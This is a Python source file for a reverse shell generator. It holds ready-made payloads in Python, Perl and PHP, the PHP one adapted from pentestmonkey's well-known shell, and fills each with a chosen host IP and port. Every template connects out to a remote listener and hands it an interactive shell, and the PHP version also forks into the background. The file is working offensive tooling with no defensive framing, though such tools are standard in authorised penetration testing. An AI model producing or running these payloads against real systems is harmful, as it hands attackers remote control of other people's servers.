#!/bin/env python3
'''
Reverse Shell Generator
https://github.com/AmitNiz/useful_stuff/blob/master/scripts/revshell_generator.py
Copyright (C) 2021 Amit Nizri - https://github.com/AmitNiz
'''
__author__='Amit Nizri, https://github.com/AmitNiz'

import argparse

PYTHON_REV='''import socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(({HOST_IP},{PORT}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")'''

PERL_REV='''use Socket;
$i="{HOST_IP}";
$p={PORT};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("sh -i");
};'''

PHP_REV='''<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. 
// Comments stripped to slim it down. 
// RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = {HOST_IP};
$port = {PORT};
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>'''


revshells = {'PYTHON':PYTHON_REV,'PERL':PERL_REV,'PHP':PHP_REV}


def generate(ip,port,template):
    return template.replace('{HOST_IP}',ip).replace('{PORT}',port)


parser = argparse.ArgumentParser()
parser.add_argument('language',type=str,help=f'revshell language ({",".join(revshells.keys())})')
parser.add_argument('host_ip',type=str,help='host ip')
parser.add_argument('port',type=str,help='connect to port')
parser.add_argument('-o','--output',type=str,metavar='FILENAME',help='write the output into a file')
args=parser.parse_args()


if __name__ =='__main__':
    if not args.port.isdigit():
        print('error: Invalid port number..')
        exit(1)

    if args.language.upper() in revshells.keys():
        lang = args.language.upper()

        revshell = generate(args.host_ip,args.port,revshells[lang])
    else:
        print('error: Unknown language..')
        exit(1)

    if args.output:
        open(args.output,'w').write(revshell)
    else:
        title = f'{args.language.title()} revshell:'
        print(f'\n{"-"*len(title)}\n{title}\n{"-"*len(title)}\n\n{revshell}')
